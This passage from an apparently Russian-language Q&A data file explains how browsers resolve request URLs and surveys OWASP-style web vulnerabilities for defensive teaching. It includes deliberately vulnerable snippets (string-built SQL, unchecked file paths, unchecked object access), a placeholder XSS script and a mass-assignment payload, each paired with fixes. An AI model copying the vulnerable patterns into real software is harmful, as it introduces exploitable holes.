URL\n```\n\nДопустим, текущая страница:\n\n```text\nhttps://example.com/catalog/books/page.html\n```\n\nТогда:\n\n```text\n/users\n→ https://example.com/users\n```\n\n```text\nimages/book.png\n→ https://example.com/catalog/books/images/book.png\n```\n\n```text\n../images/book.png\n→ https://example.com/catalog/images/book.png\n```\n\n```text\n?page=2\n→ https://example.com/catalog/books/page.html?page=2\n```\n\nURL Standard определяет алгоритм разрешения относительного URL относительно базового адреса. \n\n### 7. Элемент `<base>`\n\nСтраница может изменить базовый URL для относительных ссылок:\n\n```text\n<head>\n    <base href=\"https://cdn.example.com/assets/\">\n</head>\n\n<body>\n    <img src=\"images/logo.png\">\n</body>\n```\n\nРезультирующий URL:\n\n```text\nhttps://cdn.example.com/assets/images/logo.png\n```\n\nБез `<base>` адрес обычно вычислялся бы относительно URL текущего документа.\n\n### 8. Redirect от сервера\n\nПервый запрос:\n\n```text\nGET /old-page\n```\n\nСервер отвечает:\n\n```text\nHTTP/1.1 302 Found\nLocation: /new-page\n```\n\nБраузер берёт новый URL из заголовка `Location` и выполняет новый запрос:\n\n```text\nGET /new-page\n```\n\nТо есть сервер может сообщить браузеру следующий адрес через redirect.\n\n### 9. Изменение `window.location`\n\nJavaScript может инициировать навигацию:\n\n```javascript\nwindow.location.href = \"/dashboard\";\n```\n\nили:\n\n```javascript\nwindow.location.assign(\"/dashboard\");\n```\n\nБраузер вычислит абсолютный URL и загрузит новый документ:\n\n```text\nGET /dashboard\n```\n\n### 10. SPA-router\n\nВ SPA клик может сначала обрабатываться JavaScript:\n\n```javascript\nrouter.push(\"/users/42\");\n```\n\nПри этом возможны два варианта:\n\n```text\n1. Меняется только URL и frontend-компонент\n   → HTTP-запроса может не быть\n\n2. Компонент запрашивает данные\n   → fetch(\"/api/users/42\")\n```\n\nПоэтому адрес в строке браузера и URL API-запроса могут отличаться:\n\n```text\nстраница:\nhttps://example.com/users/42\n\nAPI:\nhttps://api.example.com/v1/users/42\n```\n\n### Что делает DNS\n\nDNS не определяет URL запроса.\n\nСначала браузер уже знает:\n\n```text\nhttps://api.example.com/users/42\n```\n\nЗатем он извлекает host:\n\n```text\napi.example.com\n```\n\nи через DNS получает IP-адрес:\n\n```text\napi.example.com → 203.0.113.15\n```\n\nТо есть:\n\n```text\nHTML / JavaScript / адресная строка\n→ определяют URL\n\nDNS\n→ определяет IP-адрес хоста из URL\n```\n\n### Что реально передаётся серверу\n\nДля URL:\n\n```text\nhttps://example.com:443/products/42?full=true#reviews\n```\n\nсервер получает:\n\n```text\nhost  → example.com\nport  → 443\npath  → /products/42\nquery → full=true\n```\n\nFragment:\n\n```text\n#reviews\n```\n\nсерверу не отправляется. Он используется браузером на стороне клиента.\n\n### Итоговая схема\n\n```text\nПользователь или JavaScript инициирует действие\n        ↓\nБраузер получает URL из:\nhref / src / action / fetch / location / адресной строки\n        ↓\nРазрешает относительный URL относительно base URL\n        ↓\nПолучает абсолютный URL\n        ↓\nИзвлекает scheme, host, port, path и query\n        ↓\nDNS преобразует host в IP\n        ↓\nБраузер устанавливает соединение\n        ↓\nОтправляет HTTP-запрос\n```\n\nГлавное: **место назначения задаётся HTML, JavaScript, пользователем или redirect-ответом сервера; DNS только находит IP-адрес для уже выбранного домена**."
  popularity = 2.63

[[questions]]
  id = 38
  question = "Какие типовые уязвимости бывают в веб-приложениях?"
  answer = "### Основные типы уязвимостей\n\nАктуальный OWASP Top 10:2025 выделяет десять основных категорий рисков веб-приложений: нарушение контроля доступа, неправильную конфигурацию, проблемы цепочки поставок, криптографические ошибки, инъекции, небезопасное проектирование, ошибки аутентификации, нарушения целостности, недостаточное журналирование и неправильную обработку исключительных ситуаций. Для API OWASP отдельно выделяет BOLA, массовое присваивание полей, отсутствие ограничений ресурсов, SSRF и другие характерные проблемы. \n\n### 1. Broken Access Control\n\nПользователь получает доступ к данным или операциям, которые ему не разрешены.\n\nПример:\n\n```text\nGET /api/files/42\nAuthorization: Bearer <user-token>\n```\n\nBackend получает файл только по `id`:\n\n```python\nfile = await File.get(id=file_id)\n```\n\nНо не проверяет владельца. Пользователь меняет `42` на `43` и получает чужой файл.\n\nТакую проблему называют:\n\n```text\nIDOR — Insecure Direct Object Reference\nBOLA — Broken Object Level Authorization\n```\n\nДругие варианты:\n\n- обычный пользователь вызывает административный endpoint;\n    \n- доступ контролируется только скрытой кнопкой на frontend;\n    \n- можно изменить чужой заказ;\n    \n- JWT или cookie принимаются без полной проверки;\n    \n- сервер доверяет `user_id`, переданному клиентом.\n    \n\nЗащита:\n\n```python\nfile = await File.get(\n    id=file_id,\n    owner_id=current_user.id,\n)\n```\n\nПрава должны проверяться на backend для каждого объекта и действия, а политика по умолчанию должна быть `deny by default`. OWASP в 2025 году ставит Broken Access Control на первое место; API Security Top 10 также отдельно выделяет объектную и функциональную авторизацию.\n\n### 2. SQL Injection и другие инъекции\n\nИнъекция возникает, когда пользовательские данные смешиваются с командой для интерпретатора.\n\nОпасно:\n\n```python\nquery = f\"\"\"\n    SELECT *\n    FROM users\n    WHERE username = '{username}'\n\"\"\"\n```\n\nВходные данные становятся частью структуры SQL-запроса.\n\nПравильно:\n\n```python\nquery = select(User).where(\n    User.username == username,\n)\n```\n\nИли параметризованный SQL:\n\n```python\ncursor.execute(\n    \"SELECT * FROM users WHERE username = %s\",\n    (username,),\n)\n```\n\nКроме SQL Injection существуют:\n\n```text\nNoSQL Injection\nOS Command Injection\nLDAP Injection\nTemplate Injection\nORM Injection\nXML/XPath Injection\n```\n\nОсновной принцип защиты:\n\n```text\nданные должны оставаться данными,\nа не становиться частью команды\n```\n\nДля этого используются параметризованные запросы, безопасные API, ORM без небезопасного raw SQL и строгая проверка входных данных. \n\n### 3. Cross-Site Scripting — XSS\n\nПриложение вставляет пользовательские данные в HTML или JavaScript без контекстного экранирования.\n\nНапример, пользователь сохраняет комментарий:\n\n```html\n<script>\n    maliciousCode();\n</script>\n```\n\nА сервер возвращает его как настоящий HTML.\n\nРазновидности:\n\n```text\nStored XSS\n→ вредоносные данные сохраняются на сервере\n\nReflected XSS\n→ данные сразу отражаются в ответе\n\nDOM-based XSS\n→ уязвимость возникает в frontend-коде\n```\n\nПоследствия:\n\n- выполнение JavaScript в контексте сайта;\n    \n- чтение доступных странице данных;\n    \n- выполнение запросов от имени пользователя;\n    \n- подмена интерфейса;\n    \n- кража токенов, доступных JavaScript.\n    \n\nЗащита:\n\n- контекстное экранирование HTML, атрибутов, URL и JavaScript;\n    \n- безопасные шаблонизаторы;\n    \n- отказ от `innerHTML` для недоверенных данных;\n    \n- санитаризация HTML, когда HTML действительно разрешён;\n    \n- `HttpOnly` для session cookies;\n    \n- строгая CSP как дополнительный слой.\n    \n\nCSP уменьшает последствия XSS, но не заменяет безопасную обработку вывода. \n\n### 4. CSRF\n\n**Cross-Site Request Forgery** заставляет браузер авторизованного пользователя выполнить нежелательный запрос.\n\nНапример, пользователь авторизован через cookie:\n\n```text\nCookie: session_id=abc123\n```\n\nЗлоумышленник размещает на другом сайте форму, отправляющую запрос в уязвимое приложение. Браузер может автоматически приложить session cookie.\n\n```text\nВредоносный сайт\n       ↓\nбраузер пользователя\n       ↓ автоматически добавляет cookie\nPOST /account/change-email\n```\n\nCSRF особенно важен при cookie-based аутентификации.\n\nЗащита:\n\n```text\nCSRF token\nSameSite cookies\nпроверка Origin/Referer\nFetch Metadata headers\nповторная аутентификация для критических операций\nне использовать GET для изменения состояния\n```\n\nCORS сам по себе не является полноценной CSRF-защитой. OWASP рекомендует использовать встроенную защиту фреймворка или проверяемые backend CSRF-токены для изменяющих состояние запросов. \n\n### 5. Ошибки аутентификации и управления сессиями\n\nПриложение неправильно определяет пользователя или управляет его сессией.\n\nПримеры:\n\n- слабые или стандартные пароли;\n    \n- отсутствие защиты от brute force;\n    \n- credential stuffing;\n    \n- небезопасное восстановление пароля;\n    \n- отсутствие MFA для критических аккаунтов;\n    \n- session ID не меняется после входа;\n    \n- токен не отзывается при выходе;\n    \n- access token живёт слишком долго;\n    \n- JWT проверяется без `exp`, `iss` или `aud`;\n    \n- session ID передаётся в URL;\n    \n- пароль хранится в открытом виде или слабым хешем.\n    \n\nЗащита:\n\n```text\nArgon2id или подходящий password hashing\nMFA\nrate limiting\nкороткоживущие access tokens\nбезопасная ротация refresh tokens\nSecure + HttpOnly + SameSite cookies\nинвалидация сессий\nзащищённое восстановление аккаунта\n```\n\nOWASP относит неправильную проверку credentials, session fixation, слабое хранение паролей и некорректную инвалидацию сессий к Authentication Failures. \n\n### 6. Cryptographic Failures\n\nОшибки защиты чувствительных данных:\n\n- использование HTTP вместо HTTPS;\n    \n- хранение паролей без password hashing;\n    \n- применение MD5 или SHA-1 для паролей;\n    \n- секретные ключи в репозитории;\n    \n- предсказуемые токены;\n    \n- повторное использование nonce или IV;\n    \n- отсутствие ротации ключей;\n    \n- отключённая проверка TLS-сертификата;\n    \n- чувствительные данные хранятся незашифрованными.\n    \n\nНапример, пароль нельзя хранить так:\n\n```python\npassword_hash = hashlib.sha256(password.encode()).hexdigest()\n```\n\nНужен алгоритм, предназначенный для паролей:\n\n```text\nArgon2id\nscrypt\nbcrypt\nPBKDF2 — при корректных параметрах\n```\n\nOWASP относит к этой категории отсутствие шифрования, слабые алгоритмы, утечки ключей, недостаточную энтропию и неправильное управление ключами. \n\n### 7. Security Misconfiguration\n\nУязвимость появляется не из-за бизнес-кода, а из-за небезопасных настроек.\n\nПримеры:\n\n```text\nDEBUG=True в production\nоткрытая административная панель\nстандартные пароли\nпубличный S3 bucket\nразрешение CORS для недоверенных origins\ndirectory listing\nлишние открытые порты\nдоступный .git\nstack trace в ответе\nотсутствующие security headers\nслишком широкие права контейнера или БД\n```\n\nНапример, пользователю нельзя возвращать:\n\n```text\npsycopg.errors.UndefinedTable\nFile \"/app/repositories/users.py\", line 42\nDATABASE_URL=postgresql://...\n```\n\nКлиент должен получить нейтральную ошибку:\n\n```json\n{\n  \"type\": \"/problems/internal-error\",\n  \"title\": \"Internal server error\",\n  \"status\": 500\n}\n```\n\nА полная информация должна попасть в защищённые логи.\n\n### 8. SSRF\n\n**Server-Side Request Forgery** возникает, когда backend по пользовательскому URL сам выполняет запрос.\n\nНапример:\n\n```text\nPOST /api/load-image\n\n{\n  \"url\": \"https://example.com/image.png\"\n}\n```\n\nBackend делает:\n\n```python\nresponse = await client.get(data.url)\n```\n\nАтакующий может попытаться заставить сервер обратиться:\n\n- к внутреннему сервису;\n    \n- к `localhost`;\n    \n- к cloud metadata endpoint;\n    \n- к административному API;\n    \n- к адресу, недоступному из внешней сети.\n    \n\nЗащита:\n\n```text\nallowlist разрешённых доменов\nзапрет private, loopback и link-local адресов\nповторная проверка после DNS resolution и redirect\nограничение протоколов\nсетевой egress firewall\nтаймауты и лимиты размера ответа\n```\n\nOWASP API Security определяет SSRF как возможность заставить API отправить запрос к неожиданному адресу через пользовательский URI. В OWASP Top 10:2025 SSRF включён в Broken Access Control. \n\n### 9. Path Traversal\n\nПользователь управляет путём к файлу:\n\n```text\nGET /files?name=report.pdf\n```\n\nОпасный код:\n\n```python\npath = Path(\"/uploads\") / filename\nreturn FileResponse(path)\n```\n\nБез проверки `filename` клиент может попытаться выйти за пределы каталога загрузок.\n\nЗащита:\n\n```python\nbase = Path(\"/uploads\").resolve()\ntarget = (base / filename).resolve()\n\nif not target.is_relative_to(base):\n    raise ForbiddenError()\n```\n\nЕщё лучше — не принимать физический путь от клиента, а использовать идентификатор:\n\n```text\nGET /files/42\n```\n\nи получать реальный путь из базы данных. Path Traversal включён OWASP в категорию нарушения контроля доступа. \n\n### 10. Небезопасная загрузка файлов\n\nПроблемы возникают, когда сервер доверяет:\n\n```text\nимени файла\nрасширению\nContent-Type\nсодержимому\n```\n\nНапример, файл называется:\n\n```text\navatar.png\n```\n\nно фактически содержит другой тип данных.\n\nРиски:\n\n- выполнение загруженного кода;\n    \n- XSS через SVG или HTML;\n    \n- перезапись существующего файла;\n    \n- path traversal в имени;\n    \n- заполнение диска;\n    \n- вредоносные документы;\n    \n- доступ других пользователей к файлу.\n    \n\nЗащита:\n\n```text\nallowlist форматов\nпроверка фактического содержимого\nлимит размера\nгенерация серверного имени\nхранение вне web root\nзапрет выполнения файлов\nантивирусная проверка при необходимости\nпроверка владельца при скачивании\n```\n\n### 11. Mass Assignment\n\nBackend автоматически копирует все входящие поля в модель:\n\n```python\nuser.update_from_dict(request.json())\n```\n\nКлиент передаёт:\n\n```json\n{\n  \"username\": \"alfob\",\n  \"is_admin\": true,\n  \"balance\": 1000000\n}\n```\n\nЕсли backend не ограничивает набор полей, пользователь изменит внутренние свойства.\n\nПравильно использовать отдельную входную модель:\n\n```python\nclass UserUpdate(BaseModel):\n    model_config = ConfigDict(extra=\"forbid\")\n\n    username: str | None = None\n    avatar_url: str | None = None\n```\n\nOWASP API Security объединяет mass assignment и excessive data exposure в категорию Broken Object Property Level Authorization. \n\n### 12. Утечка лишних данных\n\nBackend возвращает объект базы целиком:\n\n```json\n{\n  \"id\": 42,\n  \"username\": \"alfob\",\n  \"password_hash\": \"...\",\n  \"refresh_token_hash\": \"...\",\n  \"internal_status\": \"reviewed\"\n}\n```\n\nДаже когда frontend не отображает поля, они уже переданы клиенту.\n\nПравильно использовать response schema:\n\n```python\nclass UserResponse(BaseModel):\n    id: int\n    username: str\n    avatar_url: str | None\n```\n\nПравило:\n\n```text\nне возвращать данные,\nкоторые клиенту не нужны и не разрешены\n```\n\n### 13. Unrestricted Resource Consumption\n\nEndpoint не ограничивает ресурсы:\n\n```text\nGET /users?limit=10000000\n```\n\nИли позволяет:\n\n- загружать файлы любого размера;\n    \n- отправлять неограниченное число запросов;\n    \n- создавать огромные batch-операции;\n    \n- запускать дорогие отчёты;\n    \n- отправлять бесконечное количество SMS или писем;\n    \n- открывать слишком много WebSocket-соединений.\n    \n\nПоследствия:\n\n```text\nDoS\nпереполнение памяти\nзаполнение диска\nвысокие расходы на сторонние API\nисчерпание connection pool\n```\n\nЗащита:\n\n```text\nrate limiting\nтаймауты\nлимит body и файлов\nограничение batch size\nпагинация\nквоты пользователя\nограничение параллельных операций\n```\n\nOWASP API Security отдельно выделяет Unrestricted Resource Consumption и злоупотребление чувствительными бизнес-процессами. \n\n### 14. Уязвимости бизнес-логики\n\nЗапрос технически корректен, но приложение позволяет выполнить нежелательную последовательность действий.\n\nПримеры:\n\n- применить один промокод несколько раз;\n    \n- заказать товар с отрицательным количеством;\n    \n- отменить уже выплаченный заказ;\n    \n- самостоятельно подтвердить собственную операцию;\n    \n- купить больше билетов, чем разрешено;\n    \n- повторно выполнить платёж;\n    \n- изменить цену через request body;\n    \n- пропустить обязательный этап процесса.\n    \n\nТакие проблемы часто не обнаруживаются обычной проверкой типов:\n\n```json\n{\n  \"quantity\": 1,\n  \"price\": 1\n}\n```\n\nОба числа валидны, но цену должен определять backend, а не клиент.\n\nЗащита требует threat modeling, проверки переходов состояния и явного определения недопустимых сценариев. OWASP относит отсутствие необходимых контролей и ошибки бизнес-логики к Insecure Design. \n\n### 15. Race Condition\n\nДва запроса одновременно читают старое состояние:\n\n```text\nЗапрос A: остаток = 1\nЗапрос B: остаток = 1\n\nA создаёт заказ\nB создаёт заказ\n```\n\nВ результате продаются две единицы при остатке в одну.\n\nЗащита:\n\n```text\nтранзакции\nrow-level locks\nатомарные UPDATE\nUNIQUE и CHECK constraints\noptimistic locking\nidempotency keys\n```\n\nНапример:\n\n```sql\nUPDATE products\nSET stock = stock - 1\nWHERE id = :id\n  AND stock >= 1;\n```\n\nПосле выполнения нужно проверить количество изменённых строк.\n\n### 16. Небезопасная десериализация и нарушение целостности\n\nПриложение принимает сериализованный объект и доверяет его содержимому:\n\n```text\ncookie\nqueue message\npickle object\nsigned state\nsoftware update\nCI/CD artifact\n```\n\nОсобенно опасно десериализовать недоверенные данные форматами, способными создавать произвольные объекты или запускать код.\n\nЗащита:\n\n- не использовать небезопасную десериализацию для внешних данных;\n    \n- применять простые форматы вроде JSON;\n    \n- проверять схему;\n    \n- проверять цифровые подписи артефактов;\n    \n- использовать доверенные репозитории;\n    \n- защищать CI/CD;\n    \n- проверять целостность обновлений.\n    \n\nOWASP относит небезопасную десериализацию, неподтверждённые обновления и доверие к неподписанным данным к Software or Data Integrity Failures. \n\n### 17. Уязвимые зависимости и цепочка поставок\n\nПриложение может быть уязвимо даже при безопасном собственном коде, если используются:\n\n```text\nустаревшие библиотеки\nнеподдерживаемый runtime\nвредоносный пакет\nскомпрометированный Docker image\nнебезопасный CI/CD pipeline\nподменённый frontend-скрипт\n```\n\nЗащита:\n\n```text\nфиксировать версии зависимостей\nпроверять прямые и транзитивные зависимости\nиспользовать lock-файлы\nсканировать зависимости и образы\nвести SBOM\nограничивать права CI/CD\nпроверять подписи артефактов\nобновлять компоненты\n```\n\nOWASP Top 10:2025 расширил прежнюю категорию уязвимых компонентов до Software Supply Chain Failures, включая зависимости, системы сборки и инфраструктуру распространения. \n\n### 18. Open Redirect\n\nПриложение принимает адрес перенаправления:\n\n```http\nGET /login?next=https://other.example\n```\n\nи без проверки возвращает:\n\n```http\nHTTP/1.1 302 Found\nLocation: https://other.example\n```\n\nЭто позволяет использовать доверенный домен приложения для фишинга.\n\nЗащита:\n\n```text\nпринимать относительные пути\nиспользовать allowlist origins\nне перенаправлять на произвольный пользовательский URL\n```\n\n### 19. Clickjacking\n\nЗлоумышленник встраивает приложение в прозрачный `iframe` и размещает поверх собственный интерфейс. Пользователь думает, что нажимает одну кнопку, но взаимодействует с целевым сайтом.\n\nЗащита:\n\n```text\nContent-Security-Policy: frame-ancestors 'none'\n```\n\nили разрешение только доверенным родителям:\n\n```text\nContent-Security-Policy: frame-ancestors 'self'\n```\n\nOWASP рекомендует `frame-ancestors` CSP для защиты от framing-атак. \n\n### 20. Недостаточные логи и обработка ошибок\n\nПриложение может:\n\n- не записывать неудачные входы;\n    \n- не фиксировать изменение прав;\n    \n- не оповещать о подборе паролей;\n    \n- позволять изменять логи;\n    \n- записывать в логи токены и пароли;\n    \n- возвращать stack trace клиенту;\n    \n- при ошибке разрешать операцию вместо запрета;\n    \n- оставлять систему в частично изменённом состоянии.\n    \n\nПравильный принцип:\n\n```text\nfail closed\n```\n\nТо есть при неопределённом состоянии безопаснее запретить действие, чем разрешить его.\n\nOWASP Top 10:2025 отдельно выделяет Security Logging and Alerting Failures и новую категорию Mishandling of Exceptional Conditions, включающую утечки через ошибки, `fail open`, необработанные исключения и некорректное поведение при необычных состояниях. \n\n### Краткая карта\n\n|Уязвимость|Основная причина|\n|---|---|\n|IDOR/BOLA|Нет проверки доступа к объекту|\n|Privilege escalation|Нет проверки роли или permission|\n|SQL Injection|Данные смешиваются с SQL|\n|XSS|Недоверенные данные выполняются браузером|\n|CSRF|Браузер автоматически отправляет credentials|\n|SSRF|Backend обращается по пользовательскому URL|\n|Path Traversal|Пользователь управляет путём файла|\n|Mass Assignment|Клиент может менять внутренние поля|\n|File Upload|Сервер доверяет имени, типу или содержимому файла|\n|Race Condition|Конкурентные операции нарушают инвариант|\n|DoS|Нет лимитов ресурсов|\n|Crypto Failures|Небезопасное хранение или передача данных|\n|Misconfiguration|Небезопасные настройки инфраструктуры|\n|Supply Chain|Уязвимые зависимости или CI/CD|\n|Business Logic|Не предусмотрен опасный сценарий|\n\n### Базовые меры защиты\n\n```text\nПроверять авторизацию на backend\nИспользовать параметризованные запросы\nЭкранировать вывод в зависимости от контекста\nПрименять CSRF-защиту при cookie-аутентификации\nВалидировать все внешние данные\nОграничивать размер и частоту запросов\nИспользовать HTTPS\nБезопасно хранить пароли и секреты\nОбновлять зависимости\nИспользовать транзакции и DB constraints\nНе раскрывать внутренние ошибки\nВести логи и настраивать оповещения\nПроектировать систему по deny by default\n```\n\nГлавная идея:\n\n```text\nвалидация отвечает:\n«корректны ли данные?»\n\nаутентификация:\n«кто выполняет запрос?»\n\nавторизация:\n«разрешено ли ему это действие?»\n\nбезопасная обработка:\n«не станут ли данные кодом или командой?»\n\nбизнес-логика:\n«допустима ли операция в текущем состоянии?»\n```"
